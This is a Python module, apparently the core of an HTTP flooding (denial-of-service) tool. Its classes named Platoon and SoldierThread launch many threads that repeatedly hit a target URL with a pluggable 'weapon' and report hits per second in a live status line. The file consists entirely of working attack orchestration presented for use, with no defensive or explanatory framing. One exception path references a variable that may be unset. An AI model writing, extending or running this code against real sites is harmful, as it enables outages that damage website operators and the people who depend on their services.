
import random
import threading
import time
import app.console
from app.net import RequestException


class Monitor:

    def __init__(self):

        # lock used when modifying the monitor state
        self._lock = threading.Lock()

        # monitor status / state
        self._last_http_status = 0
        self._last_total_hits = 0
        self._start_time = 0

    def start(self):
        """
        Start monitoring. This will reset the internal state of the monitor so hits per sec
        will be calculated from now on.
        """

        self._lock.acquire()
        self._last_http_status = 200
        self._last_total_hits = 0
        self._start_time = time.time()
        self._lock.release()

    def report_hit(self, thread, num_hits, http_status):

        self._lock.acquire()
        self._last_http_status = http_status
        self._last_total_hits += num_hits
        self._lock.release()

    def get_status(self):

        time_elapsed = time.time() - self._start_time

        return (
            self._last_http_status,
            self._last_total_hits / time_elapsed
        )


class SoldierThread(threading.Thread):

    def __init__(self, tid, monitor):
        """
        :param tid:
        :param monitor:
        """

        threading.Thread.__init__(self)

        self._id = tid
        self._monitor = monitor

        self._target_url = ''
        self._weapon = None

        # whether the thread should be actively attacking
        self._is_attacking = False

    def attack(self, **kwargs):

        self._target_url = kwargs['target_url'] if 'target_url' in kwargs else None
        self._weapon = kwargs['weapon'] if 'weapon' in kwargs else None

        self._is_attacking = True

        self.start()

    def hold_fire(self):

        app.console.log("stopping soldier thread #%d" % self._id)

        self._is_attacking = False

        if self.isAlive():
            self.join()

    def run(self):

        app.console.log("starting soldier thread #%d" % self._id)

        while self._is_attacking:

            try:

                (num_hits, http_status) = self._weapon.attack(self._target_url)

            except RequestException as ex:

                app.console.error(str(ex))
                http_status = 0

            self._monitor.report_hit(self, num_hits, http_status)


class Platoon:
    """Platoon of soldier threads which run an attack."""

    def __init__(self, **kwargs):
        """

        :param num_soldiers: The number of soldier threads to spawn
        """

        self._num_soldiers = int(kwargs['num_soldiers']) if 'num_soldiers' in kwargs else 1

        self._monitor = Monitor()

        # whether the platoon should be actively attacking
        self._is_attacking = False

        # spawn all of the soldier threads
        self._soldiers = []
        for soldier_id in range(0, self._num_soldiers):
            soldier = SoldierThread(soldier_id, self._monitor)
            self._soldiers.append(soldier)

    def attack(self, **kwargs):
        """
        Start the attack. Will start up all of the soldier threads and give them a target
        :param target_url: The target URL/domain to be attacked
        :param weapon_factory: The weapon factory to use to spawn the weapons used by the soldier threads
        """

        target_url = kwargs['target_url'] if 'target_url' in kwargs else None
        weapon_factory = kwargs['weapon_factory'] if 'weapon_factory' in kwargs else None

        app.console.log("starting attack on %s" % target_url)

        self._is_attacking = True

        self._monitor.start()

        # start each of the soldier threads attacking
        # will slowely ramp up the soldier threads over a number of seconds (i.e. wont create them all at once)
        for soldier in self._soldiers:

            weapon = weapon_factory.make()

            soldier.attack(
                target_url=target_url,
                weapon=weapon
            )

            # introduce artifical delay between starting threads some where between 1-2 seconds
            # we use 11 as it is a prime numebr and will stagger the threads nicely
            delay = random.randint(0, 11) / 11 + 1.0
            time.sleep(delay)

        # add black line to be overriden by status line
        # this makes it easier to keep track of the status line and means it will not get overridden ever
        # since app.console.back() is only ever called directly before the status line is printed
        app.console.log("")

        # update status line periodically
        while self._is_attacking:

            (http_status, hits_per_sec) = self._monitor.get_status()
            status_line = "%s %0.2f hits per sec" % (http_status, hits_per_sec)

            app.console.back(1)
            if http_status == 200:
                app.console.log(status_line)
            else:
                app.console.error(status_line)

            # repeat every second
            time.sleep(1.0)

        app.console.log("done")

    def hold_fire(self):
        """Stop the attack, tell all of the soldier threads to hold_fire()"""

        self._is_attacking = False

        for soldier in self._soldiers:
            soldier.hold_fire()
